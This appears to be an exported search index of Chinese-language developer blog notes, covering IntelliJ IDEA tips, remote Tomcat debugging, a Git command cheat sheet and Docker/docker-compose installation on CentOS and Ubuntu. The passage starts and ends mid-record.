系统自己生成了entity包，以及实体类。\n\n   ![image-20211125092639951](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092639951-1671159524637-17.png)   \n\n\n\n# MybatisLog\n\n<!-- 程序运行的SQL语句可以直接拷贝运行 -->\n\n\n\n\n\n","tags":["IDEA"],"categories":["工具|部署","IDEA"]},{"title":"IDEA 使用技巧","url":"/20250619/2241d802.html","content":"\n\n\n# IDEA：Java项目打包成exe文件\n\n来源：https://blog.csdn.net/zmq836010/article/details/124257340\n\n## 将Java项目打包成Jar包\n\n1. 打开Idea，点击File》Project Settings\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_13,color_FFFFFF,t_70,g_se,x_16.png) \n\n2. Main Class：选择你项目的main函数所在的类。点击OK\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_11,color_FFFFFF,t_70,g_se,x_16.png) \n\n   ![ ](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_20,color_FFFFFF,t_70,g_se,x_16.png) \n\n   3. 选中Build，点击Build Project，再点击Build Artifacts，点击回车键，即可。\n   4. 在项目的out\\artifacts\\Demo_jar目录下，生成了一个Jar文件（可以将Jar文件复制到桌面，方便接下来操作）\n\n## 下载并安装exe4j.exe文件，将Jar包转成exe可执行文件\n\n1. 启动exe4j，点击Next，后选择“JAR in EXE” mode\n\n2. 点击Next，Output directory 可以选择桌面，选择你想要保存的exe文件的目录\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16.png) \n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16-1684724432885-111.png) \n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_15,color_FFFFFF,t_70,g_se,x_16.png) \n\n3.  点击Next\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_15,color_FFFFFF,t_70,g_se,x_16-1684724474981-116.png) \n\n4. 点击绿色的加号\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16-1684724512104-119.png) \n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_15,color_FFFFFF,t_70,g_se,x_16-1684724525195-122.png) \n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16-1684724534909-125.png) \n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16-1684724552612-128.png) \n\n   \n\n   点击Next（后面直接点next，不用配置，最后就会生成exe文件）\n\n   \n\n# IDEA添加自定义模板方法\n\n1. 首先，点击File–>Settings–>Editor–>Live Templates \n\n   ![image-20211127230339392](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230339392-1678440029358-27.png)  \n\n2. 接着，点击右上角“+”添加“Template Group”模板组，如Java\n\n​        ​![image-20211127230357335](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230357335-1678440029363-33-1684719815381-36.png)   \n\n\n\n3. 在新增的模板组内添加模板，点击右上角“+”添加“Live Template”\n\n   ![image-20211127230437624](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230437624-1678441147652-124-1684719815381-38.png)   \n\n4. 填写模板内容，定义出发快捷键选择 Enter\n\n​        ![image-20211127230500953](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230500953-1678440029363-35-1684719815381-34.png)   \n\n5. 定义作用域\n\n   ![image-20211127230524523](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230524523-1678441147652-126-1684719815381-32.png)   \n\n   \n\n   这样就OK了，可以仿照这种方式，自定义很多快捷输入的语句，比如输入，输出等：\n\n    ![image-20211127230606315](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230606315-1678441147653-128-1684719815381-40.png)   \n\n\n\n# IDEA 针对Terminal更新环境变量\n\n1. 修改shell path 调用的程序\n\n![image-20230522093839928](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230522093839928.png) \n\n2. Git 环境变量\n\n![image-20230522094033065](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230522094033065.png)  \n\n3. 在IDEA中的命令行终端中输入**bash** 即可调用**git bash** ，使用结束后输入**exit**退出\n\n# IDEA 开启RunDashboard\n\n修改 .idea/workspace.xml 文件\n\n![b8b40c372c3114cb88d98abdc1621768.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-163802692934114-1678440286408-97-1684409715194-1.png)   \n\n```xml\n找到<component name=\"RunDashboard\"> 添加配置：\n\n\n<option name=\"configurationTypes\"> \n  <set> \n    <option value=\"SpringBootApplicationConfigurationType\" /> \n  </set> \n</option>\n```\n\n最终配置：\n\n  ![c8e483b781cfd443e68a15b94345844b.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image004-1678440286408-99-1684409715194-3.png)  \n 显示效果：\n\n  ![511e587a5be1655e22f23d7981c2b8c8.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image005-1678440286408-101-1684409715194-5.png)  \n\n\n\n\n\n# IDEA 配置Git忽略提交文件\n\n1. 点击**File->Settings->Plugins**，点击Browse repositories…\n\n   ![3b2f62bb2f51c955400f9d9ff9945a6e.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-163802704819915-1678440995166-112.png)  \n\n2. 搜索**.ignore**，点击**Install**，安装完成后，重启IDEA\n\n3. 在 项目上 右键->New ->.ignore file ->.gitignore file(Git)\n\n   ![bdd020c028cf2b207232d1c58ac45f66.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image004-163802704820016.png)  \n\n4. 先选择Example user template好了，以后有什么想过滤的可以自行添加，~最后点击Generate生成\n\n   ![3e4705d5b72a8e3944b7e70d4f967e89.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image006-1678440995166-116.png)  \n\n5. 然后就会发现被忽略的文件名变成了灰色 \n\n6. 也可以右键文件将其加入忽略的名单中 \n\n   ![89c2f940c462b9558a9158f433a6e13b.png](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image008-1678440995166-118.png)   \n\n7. 以下是一些.gitignore文件忽略的匹配规则：\n\n   | 通配符   | 说明                                                 |\n   | -------- | ---------------------------------------------------- |\n   | .a       | 忽略所有 .a 结尾的文件                               |\n   | !lib.a   | 但 lib.a 除外                                        |\n   | /TODO    | 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODO |\n   | build/   | 忽略 build/ 目录下的所有文件                         |\n   | doc/.txt | 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt    |\n\n8. 注意\n\n   .gitignore只能忽略那些原来没有被track的文件，如果某些文件已经被纳入了版本管理中，则修改.gitignore是无效的。\n    那么解决方法就是先把本地缓存删除（改变成未track状态），然后再提交：\n\n    ```\n   输入：\n   git rm -r –cached filePath\n   git commit -m “remove xx”\n   \n   或者：\n   git rm -r –cached .\n   git add .\n   git commit -m “update .gitignore”\n   \n   \n   来解释下几个参数\n   -r 是删除文件夹及其子目录\n   –cached 是删除暂存区里的文件而不删除工作区里的文件，\n   \n   第一种是删除某个文件，第二种方法就把所有暂存区里的文件删了，再加一遍，相当于更新了一遍。\n   \n    ```\n\n   \n\n# IDEA 配置SpringBoot热部署\n\n\n\n- 导入devtools依赖即可\n\n  ```xml\n  <dependency> \n    <groupId>org.springframework.boot</groupId> \n    <artifactId>spring-boot-devtools</artifactId> \n    <optional>true</optional> \n  </dependency>\n  ```\n\n- 然后到`setting`框中，输入`compiler`，然后勾选**`Build project automatically`**\n\n- 然后按住**shift+alt+ctrl+/**，进入**`maintenance`**,然后选择进入**Registry**\n\n- 勾选**`compiler.automake.when.app.running`**\n\n\n\n# IDEA 针对Terminal更新环境变量\n\n> 目的： Terminal 终端直接使用GitBash，IDEA默认使用的是`cmd`\n\n打开Terminal 的Settings， 可以看到 默认的shell path\n\n![image-20230310184202752](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230310184202752-1684410325349-13.png) \n\n\n\n## 方法一：修改默认的schell path\n\n![image-20230310184346589](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230310184346589-1684410325349-15.png) \n\n\n\n## 方法二：将git的bash.exe配置到操作系统环境变量path中\n\n![ ](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230310184700388.png)  \n\n\n\n此时，在Terminal中 输入 `bash`  直接打开 git bash\n\n\n\n# 远程调试 TOMCAT\n\n##  TOMCAT服务器配置\n\n\n\n- 方式一：官方推荐\n\n  在`catalina.sh`文件的文件头加上如下配置项即可。其中`address=8000`的端口号8000 自定义\n\n  ```sh\n  export JAVA_OPTS='-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000'\n  ```\n\n- 方式二：\n\n  修改`catalina.sh`  的 `JPDA_ADDRESS`\n\n  修改前：\n\n  ![image-20221216141033811](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216141033811-1684719109569-5.png) \n\n  修改后：\n\n  ![image-20221216141158238](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216141158238-1684719109569-1.png) \n\n\n\n## 本地IDEA配置\n\nIDEA 版本号：2022.3\n\n- 方式一：Remote JVM Debug\n\n  1. 工具栏：Run-> Edit Configurations , 添加 `Remote JVM Debug`\n\n     ![image-20221216141658513](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216141658513-1684719109569-3.png)  \n\n  2. 配置远程服务器IP和DEBUG端口，以及选择本地项目\n\n     <img src=\"https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216142129704-1684719109569-7.png\" alt=\"image-20221216142129704\" style=\"zoom: 80%;\" /> \n\n  3. 本地DEBUG启动,启动成功之后，控制台会输出相应链接成功日志\n\n     ![image-20221216142244190](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216142244190-1671172511331-28-1684719109569-9.png)  \n\n- 方式二：Tomcat Remote 模式\n\n  1. 添加Tomcat Server 配置\n\n     ![image-20221216142501412](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216142501412-1684719109569-11.png)   \n\n  2. 配置远程服务器IP和应用端口 \n\n     <img src=\"https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216142946755-1684719109569-15.png\" alt=\"image-20221216142946755\" style=\"zoom:80%;\" /> c.  \n\n  3. 配置远程服务器DEBUG端口 \n\n     ![image-20221216143100989](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216143100989-1684719109569-17.png) \n\n  4. debug 启动\n\n     ![image-20221216143344220](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216143344220-1684719109569-13.png) \n\n     服务器监听：\n\n     ![image-20221216143412864](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221216143412864-1684719109569-19.png) \n\n","tags":["IDEA"],"categories":["工具|部署","IDEA"]},{"title":"Git","url":"/20250619/69c3279c.html","content":"\n\n\n# 场景命令\n\n## 一、切换分支临时处理之后恢复\n\n经常有这样的事情发生，当你正在进行项目中某一部分的工作，里面的东西处于一个比较杂乱的状态，而你想转到其他分支上进行一些工作。问题是，你不想提交进行了一半的工作。解决这个问题的办法就是`git stash`命令。\n\n现在你在分值aaa，已经做了一些修改，现在想要分支bbb做一些事情，但又不想提交aaa上的一些修改：\n\n```sh\n# 保存分支aaa的工作状态\ngit stash\n\n# 切换到分支bbb\ngit checkout bbb\n\n# 在分支bbb上做一些操作后，返回分支aaa\ngit checkout aaa\n\n# 恢复之前的工作状态\ngit stash apply 或者 git stash pop\n```\n\n\n\n## 二、处理 Git 忘记切分支修改了代码的情况\n\n有时候没注意分支，直接在 master 上做开发了，假设你现在在 master 分支上已经修改了文件：\n\n```sh\n# 把当前未提交到本地（和服务器）的代码推入到 Git 的栈中：\n$ git stash\n\n# 查看效果：\n$ git status \n\n# 切换分支：\n$ git branch dev \n\n# 还原代码：\n$ git stash apply\n```\n\n\n\n## 三、本地新建分支后，同步到远程不存在的分支\n\n```sh\n$ git push local-branch-name:remote-branch-name\n```\n\n## 四、撤销某次commit\n\n```sh\n# 先找到commit id\n$ git log\n\n# 撤销\n$ git reset --hard commit_id\n```\n\n\n\n## 五、重命名分支\n\n```sh\n1、本地分支重命名\n git branch -m oldName  newName\n \n2、将重命名后的分支推送到远程\ngit push origin newName\n```\n\n\n\n## 六、分支覆盖\n\n```sh\ngit checkout pre-release\ngit reset --hard origin/develop\ngit push -f\n```\n\n## 七、查看日志\n\n```sh\ngit log --graph --pretty=oneline --abbrev-commit\n```\n\n\n\n## 八、合并多个commit为另外的总commit\n\n```\n参考：https://backlog.com/git-tutorial/cn/stepup/stepup7_5.html\n```\n\n当前分支：分支1\n待合并分支：分支2\n\n```sh\n$ git checkout -b 分支2 origin/分支2\n$ git checkout 分支1\n$ git merge --squash 分支2\n$ git commit -m 'PDF fix1'\n$ git push origin\n```\n\n\n\n实际应用\n\n```sh\ngit fetch origin -p\ngit pull\ngit branch -m  feature-11111 feature-11111-1\ngit push origin --delete feature-11111\ngit checkout -b dev origin/dev\ngit branch -m dev feature-11111\ngit checkout feature-11111\ngit push origin feature-11111\ngit branch -m feature-11111 dd\ngit checkout -b feature-11111 origin/feature-11111\ngit branch -D dd\n\ngit merge --squash feature-11111-1\n\ngit commit -m 简介\ngit push origin feature-11111\ngit branch -D feature-11111-1\ngit branch -m feature-11111 dd\ngit checkout -b feature-11111 origin/feature-11111\ngit branch -D dd\n```\n\n\n\n## 九、解决git文件名大小写无法修改的问题\n\n```\ngit默认配置为忽略大小写，因此无法正确检测大小写的更改\n\n运行：\ngit config core.ignorecase false\n\n关闭git忽略大小写配置，即可检测到大小写名称更改\n```\n\n## 十、如何快速关联/ 修改 Git 远程仓库地址\n\n\n\n\n\n# 常用命令\n\n## 一、流程图示\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/f96b3444-14a7-4793-a4a5-a0bd3d52b576.png)\n\nGit中几个专用名词的译名如下：\n\n```\nWorkspace：工作区\nIndex / Stage：暂存区\nRepository：仓库区（或本地仓库）\nRemote：远程仓库\n```\n\n## 二、新建代码库\n\n```sh\n# 在当前目录新建一个Git代码库\n$ git init\n\n# 新建一个目录，将其初始化为Git代码库\n$ git init [project-name]\n\n# 下载一个项目和它的整个代码历史\n$ git clone [url]\n```\n\n## 三、配置\n\nGit的设置文件为`.gitconfig`，Git的配置分为两种：\n\n- 全局配置：在用户主目录下\n- 在项目目录下\n\n注意：在当前项目下面查看的配置（`git config --list`）是全局配置 + 当前项目的配置，使用的时候会优先使用当前项目的配置；\n\n一般公司项目都是在GitLab上的，所以可以在项目根目录进行单独配置，不用全局设置，以免影响其他远程仓库如GitHub的使用。\n\n```sh\n# 显示当前的Git配置\n$ git config --list\n\n# 编辑Git配置文件\n$ git config -e [--global]\n\n# 设置提交代码时的用户信息\n$ git config [--global] user.name \"[name]\"\n$ git config [--global] user.email \"[email address]\"\n```\n\n\n\n## 四、增加/删除文件\n\n```sh\n# 添加指定文件到暂存区\n$ git add [file1] [file2] ...\n\n# 添加指定目录到暂存区，包括子目录\n$ git add [dir]\n\n# 添加当前目录的所有文件到暂存区\n$ git add .\n\n# 添加每个变化前，都会要求确认\n# 对于同一个文件的多处变化，可以实现分次提交\n$ git add -p\n\n# 删除工作区文件，并且将这次删除放入暂存区\n$ git rm [file1] [file2] ...\n\n# 停止追踪指定文件，但该文件会保留在工作区\n$ git rm --cached [file]\n\n# 改名文件，并且将这个改名放入暂存区\n$ git mv [file-original] [file-renamed]\n```\n\n\n\n## 五、代码提交\n\n```sh\n# 提交暂存区到仓库区\n$ git commit -m [message]\n\n# 提交暂存区的指定文件到仓库区\n$ git commit [file1] [file2] ... -m [message]\n\n# 提交工作区自上次commit之后的变化，直接到仓库区\n$ git commit -a\n\n# 提交时显示所有diff信息\n$ git commit -v\n\n# 使用一次新的commit，替代上一次提交\n# 如果代码没有任何新变化，则用来改写上一次commit的提交信息\n$ git commit --amend -m [message]\n\n# 重做上一次commit，并包括指定文件的新变化\n$ git commit --amend [file1] [file2] ...\n```\n\n## 六、分支\n\n```sh\n# 列出所有本地分支\n$ git branch\n\n# 列出所有远程分支\n$ git branch -r\n\n# 列出所有本地分支和远程分支\n$ git branch -a\n\n# 新建一个分支，但依然停留在当前分支\n$ git branch [branch-name]\n\n# 新建一个分支，并切换到该分支\n$ git checkout -b [branch]\n\n# 新建一个分支，指向指定commit\n$ git branch [branch] [commit]\n\n# 新建一个分支，与指定的远程分支建立追踪关系\n$ git branch --track [branch] [remote-branch]\n\n# 切换到指定分支，并更新工作区\n$ git checkout [branch-name]\n\n# 切换到上一个分支\n$ git checkout -\n\n# 建立追踪关系，在现有分支与指定的远程分支之间\n$ git branch --set-upstream [branch] [remote-branch]\n\n# 合并指定分支到当前分支\n$ git merge [branch]\n\n# 选择一个commit，合并进当前分支\n$ git cherry-pick [commit]\n\n# 删除分支\n$ git branch -d [branch-name]\n\n# 删除远程分支\n$ git push origin --delete [branch-name]\n$ git branch -dr [remote/branch]\n```\n\n\n\n## 七、标签\n\n```sh\n# 列出所有tag\n$ git tag\n\n# 新建一个tag在当前commit\n$ git tag [tag]\n\n# 新建一个tag在指定commit\n$ git tag [tag] [commit]\n\n# 删除本地tag\n$ git tag -d [tag]\n\n# 删除远程tag\n$ git push origin :refs/tags/[tagName]\n\n# 查看tag信息\n$ git show [tag]\n\n# 提交指定tag\n$ git push [remote] [tag]\n\n# 提交所有tag\n$ git push [remote] --tags\n\n# 新建一个分支，指向某个tag\n$ git checkout -b [branch] [tag]\n```\n\n## 八、查看信息\n\n```sh\n# 显示有变更的文件\n$ git status\n\n# 显示当前分支的版本历史\n$ git log\n\n# 显示commit历史，以及每次commit发生变更的文件\n$ git log --stat\n\n# 搜索提交历史，根据关键词\n$ git log -S [keyword]\n\n# 显示某个commit之后的所有变动，每个commit占据一行\n$ git log [tag] HEAD --pretty=format:%s\n\n# 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件\n$ git log [tag] HEAD --grep feature\n\n# 显示某个文件的版本历史，包括文件改名\n$ git log --follow [file]\n$ git whatchanged [file]\n\n# 显示指定文件相关的每一次diff\n$ git log -p [file]\n\n# 显示过去5次提交\n$ git log -5 --pretty --oneline\n\n# 显示所有提交过的用户，按提交次数排序\n$ git shortlog -sn\n\n# 显示指定文件是什么人在什么时间修改过\n$ git blame [file]\n\n# 显示暂存区和工作区的差异\n$ git diff\n\n# 显示暂存区和上一个commit的差异\n$ git diff --cached [file]\n\n# 显示工作区与当前分支最新commit之间的差异\n$ git diff HEAD\n\n# 显示两次提交之间的差异\n$ git diff [first-branch]...[second-branch]\n\n# 显示今天你写了多少行代码\n$ git diff --shortstat \"@{0 day ago}\"\n\n# 显示某次提交的元数据和内容变化\n$ git show [commit]\n\n# 显示某次提交发生变化的文件\n$ git show --name-only [commit]\n\n# 显示某次提交时，某个文件的内容\n$ git show [commit]:[filename]\n\n# 显示当前分支的最近几次提交\n$ git reflog\n```\n\n## 九、远程同步\n\n```sh\n# 下载远程仓库的所有变动\n$ git fetch [remote]\n\n# 显示所有远程仓库\n$ git remote -v\n\n# 显示某个远程仓库的信息\n$ git remote show [remote]\n\n# 增加一个新的远程仓库，并命名\n$ git remote add [shortname] [url]\n\n# 取回远程仓库的变化，并与本地分支合并\n$ git pull [remote] [branch]\n\n# 上传本地指定分支到远程仓库\n$ git push [remote] [branch]\n\n# 强行推送当前分支到远程仓库，即使有冲突\n$ git push [remote] --force\n\n# 推送所有分支到远程仓库\n$ git push [remote] --all\n```\n\n## 十、撤销\n\n```sh\n# 恢复暂存区的指定文件到工作区\n$ git checkout [file]\n\n# 恢复某个commit的指定文件到暂存区和工作区\n$ git checkout [commit] [file]\n\n# 恢复暂存区的所有文件到工作区\n$ git checkout .\n\n# 撤销git add\n# 如果是撤销所有的已经add的文件:  \ngit reset HEAD .\n# 如果是撤销某个文件或文件夹（filename：文件名或者文件夹名）\ngit reset HEAD -filename\n\n# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变\n$ git reset [file]\n\n# 重置暂存区与工作区，与上一次commit保持一致\n$ git reset --hard\n\n# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变\n$ git reset [commit]\n\n# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致\n$ git reset --hard [commit]\n\n# 重置当前HEAD为指定commit，但保持暂存区和工作区不变\n$ git reset --keep [commit]\n\n# 新建一个commit，用来撤销指定commit\n# 后者的所有变化都将被前者抵消，并且应用到当前分支\n$ git revert [commit]\n\n# 暂时将未提交的变化移除，稍后再移入\n$ git stash\n$ git stash pop\n```\n\n## 十一、其他\n\n```sh\n# 生成一个可供发布的压缩包\n$ git archive\n```\n\n\n\n# 给本地分支添加备注信息\n\n## 安装全局插件\n\n```bat\nnpm i -g git-br\n```\n\n## 查看备注信息（安装插件）\n\n```sh\ngit-br\n```\n\n## 查看信息（未安装插件）\n\n```sh\ngit config branch.feature_20150713_hd-123.description\n```\n\n## 给分支添加备注\n\n```sh\ngit config branch.feature_20150713_hd-123.description 海南放款\n```\n\n\n\n\n\n# 问题记录\n\n##  SECURITY WARNING\n\n```sh\n$ git pull\nwarning: ----------------- SECURITY WARNING ----------------\nwarning: | TLS certificate verification has been disabled! |\nwarning: ---------------------------------------------------\nwarning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify for more information.\nwarning: ----------------- SECURITY WARNING ----------------\nwarning: | TLS certificate verification has been disabled! |\nwarning: ---------------------------------------------------\nwarning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify for more information.\nwarning: ----------------- SECURITY WARNING ----------------\nwarning: | TLS certificate verification has been disabled! |\nwarning: ---------------------------------------------------\nwarning: HTTPS connections may not be secure. See https://aka.ms/gcm/tlsverify for more information.\nwarning: fetch updated the current branch head. \nfast-forwarding your working tree from\n\n```\n\n解决\n\n```sh\n git config --global http.sslVerify true\n```\n\n\n\n## 遇到问题\n\n使用代理后：\n\n```sh\nD:\\_NoteSpace\\Hexo\\hmxyl>git clone https://github.com/kaiiiz/hexo-theme-book.git themes/book\nCloning into 'themes/book'...\nfatal: unable to access 'https://github.com/kaiiiz/hexo-theme-book.git/': Failed to connect to github.com port 443 after 21100 ms: Couldn't connect to server\n```\n\n解决：\n\n```sh\ngit config --global --unset https.proxy\ngit config --global https.proxy 127.0.0.1:7890\ngit config --global http.proxy 127.0.0.1:7890\n```\n\n","tags":["Git"],"categories":["工具|部署","Git"]},{"title":"配置Docker环境","url":"/20250619/8c5d6123.html","content":"\n#  CentOS配置Docker环境\n\n##  1.  修改docker配置\n\n```sh\nmkdir /etc/docker\nvim /etc/docker/daemon.json\n```\n\n添加内容\n\n```json\n{\n    \"registry-mirrors\": [\"https://7ixh250y.mirror.aliyuncs.com\"],\n    \"data-root\": \"/data/docker_mirror\"\n}\n```\n\n查看填写内容\n\n```sh\ncat /etc/docker/daemon.json\n```\n\n> registry-mirrors： 镜像加速\n>\n> insecure-registries： 私有仓库地址\n>\n> data-root：docker 数据保存地址，放到盘大的目录防止根目录的盘满\n\n##  2. 安装docker服务\n\n可选(如果之前有安装，可以选择卸载掉)\n\n```sh\n#查看已安装的docker包\nyum list installed | grep docker\n#卸载已安装的包\nyum remove xxx  xxx xx\n```\n\n执行命令开始安装docker\n\n\n\n```sh\n#安装依赖  \nyum install -y yum-utils\n#添加docker源\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n#查看docker-ce支持版本 \nyum list docker-ce --showduplicates|sort -r\n#开启一些权限\nchattr -i /etc/group &&  chattr -i /etc/passwd && chattr -i /etc/gshadow && chattr -i /etc/shadow\n#开始正式安装docker       \nyum install -y docker-ce-19.03.9  docker-ce-cli-19.03.9\n\nsystemctl start docker\n# 验证：执行docker -v ,如果出现版本号就代表成功了\ndocker -v\n```\n\n- 开机启动Dockerr服务\n\n    ```sh\n    systemctl enable docker.service\n    systemctl enable docker.socket\n    ```\n\n- 开机启动检查：`systemctl list-unit-files | grep docker`\n\n    ```sh\n    # systemctl list-unit-files | grep docker\n    docker.service                             enabled         enabled      \n    docker.socket                              enabled         enabled\n    ```\n\n    \n\n说明： 不建议安装最新版本的docker，有可能ranche支持会不好\n\n\n\n## 3. 安装Docker Compose\n\n### （1）下载 docker-compose\n\n执行如下命令进行下载\n\n```bash\ncurl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n```\n\n若速度较慢，可以使用如下命令：\n\n```bash\ncurl -L \"https://mirror.ghproxy.com/https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n```\n\n### （2）修改目录权限\n\n```bash\nchmod  x /usr/local/bin/docker-compose\n```\n\n### （3）创建软连接\n\n```bash\nln -s /usr/local/bin/docker-compose /usr/bin/docker-compose\n```\n\n### （4）验证安装是否完成\n\n执行如下命令，如果可以正常显示版本号，则表示已经完成\n\n```bash\ndocker-compose --version\n```\n\n\n\n# Ubuntu 配置Docker环境\n\n## 1.卸载旧版本Docker\n\n```sh\n#卸载旧版本docker\napt-get remove docker docker-engine docker-ce docker.io  \n\n#清空旧版docker占用的内存\napt-get remove --auto-remove docker\n\n#更新系统源\napt-get update\n```\n\n## 2.配置安装环境\n\n```\napt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common\n```\n\n## 3. 添加阿里云的docker GPG密钥\n\n```\ncurl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | apt-key add -\n```\n\n## 4. 添加阿里镜像源\n\n```\nadd-apt-repository \"deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable\"\n\n#更新\napt-get update\n```\n\n## 5. 查看有哪些版本\n\n```\napt-cache madison docker-ce\n```\n\n[![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200613220949677-1678135240557-71-1680604004354-14.png)](https://img-blog.csdnimg.cn/20200613220949677.png)\n\n## 6. 安装最新版/指定版本\n\n```sh\n#安装最新版\napt-get install -y docker-ce\n\n#安装5:19.03.6~3-0~ubuntu-bionic版\napt-get install -y docker-ce=5:19.03.6~3-0~ubuntu-bionic\n```\n\n## 7. 重启Docker\n\n```sh\nservice docker restart\n# 或者\nsystemctl restart docker\n```\n\n## 8. 查看Docke版本\n\n```\ndocker version\n```\n\n## 9. 配置容器镜像加速器\n\n```sh\nmkdir /etc/docker\nvim /etc/docker/daemon.json\n```\n\n添加内容\n\n```json\n{\n    \"registry-mirrors\": [\"https://7ixh250y.mirror.aliyuncs.com\"],\n    \"data-root\": \"/data/docker_mirror\"\n}\n```\n\n查看填写内容\n\n```sh\ncat /etc/docker/daemon.json\n```\n\n> registry-mirrors： 镜像加速\n>\n> insecure-registries： 私有仓库地址\n>\n> data-root：docker 数据保存地址，放到盘大的目录防止根目录的盘满\n\n重启 Docker 服务\n\n```\n$ systemctl daemon-reload \n$ systemctl restart docker\n```\n\n检查设置是否生效\n\n```sh\n$ docker info\n$ docker run hello-world\n```\n\n\n\n\n\n## 10. 运行hello-world验证docker-ce是否安装成功\n\n```\ndocker run --rm hello-world\n```\n\n安装成功显示 \n\n![image-20230404183345217](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230404183345217.png) \n\n## 11. 安装docker-compose\n\n- 安装docker-compose\n\n    ```sh\n    # 安装pip\n    apt install python3-pip\n    # 更新一下库\n    apt-get update\n    # 更新一下pip\n    pip3 install --upgrade pip\n    # 安装docker-compose\n    pip3 